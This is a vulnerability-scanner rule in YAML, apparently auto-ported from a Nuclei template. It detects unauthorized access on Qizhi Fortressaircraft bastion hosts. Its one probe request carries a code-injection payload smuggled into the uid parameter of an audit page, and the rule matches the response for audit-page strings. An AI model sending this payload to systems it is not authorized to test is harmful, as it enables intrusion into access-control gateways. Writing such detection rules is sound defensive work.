schema_version: 1
id: "cortex.community:qizhi-fortressaircraft-unauth"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Qizhi Fortressaircraft Unauthorized Access"
  description: "Qizhi Fortressaircraft is vulnerable to Unauthorized Access. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://mp.weixin.qq.com/s/FjMRJfCqmXfwPzGYq5Vhkw"
  tags: ["qizhi", "fortressaircraft", "unauth", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "错误的id" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "审计管理员" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "事件审计" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
